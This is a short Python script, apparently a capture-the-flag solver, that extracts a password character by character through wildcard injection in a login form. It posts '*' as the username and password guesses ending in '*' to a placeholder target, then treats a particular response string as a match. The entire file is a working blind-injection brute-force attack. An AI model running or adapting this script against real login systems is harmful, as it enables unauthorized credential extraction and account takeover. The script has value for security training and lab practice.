#!/usr/bin/python3

import requests
import string

keys = string.ascii_lowercase + string.ascii_uppercase + string.punctuation.replace('*', '') + string.digits
# keys = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()+,-./:;<=>?@[\]^_`{|}~0123456789

flag = ''
payload = {'username':'*','password':''}
found = True

while found:
        found = False
        for i in keys:
                payload['password'] = flag + i + '*'
                r = requests.post('http://<target>/login', data = payload)
                if('No search results.' in r.text):
                        flag += i
                        print(flag)
                        found = True
